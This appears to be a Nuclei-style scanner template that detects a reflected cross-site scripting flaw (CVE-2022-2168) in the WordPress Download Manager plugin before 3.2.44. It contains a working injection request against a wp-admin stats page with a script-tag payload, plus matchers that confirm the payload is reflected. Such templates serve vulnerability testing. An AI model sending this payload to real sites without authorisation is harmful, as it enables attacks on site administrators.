id: CVE-2022-2168-XSS-download-manager

info:
  name: Download Manager < 3.2.44 - Reflected Cross-Site Scripting
  author: osamahamad
  severity: critical
  description: https://wpscan.com/vulnerability/66789b32-049e-4440-8b19-658649851010
  tags: config,exposure

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-admin/edit.php?post_type=wpdmpro&page=wpdm-stats&type=history&user_ids[]=1&"><script>alert(/XSS/)</script>'


    redirects: true 
    max-redirects: 4
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"><script>alert(/XSS/)</script>'
        part: body

      - type: word
        words:
          - "text/html"
        part: header
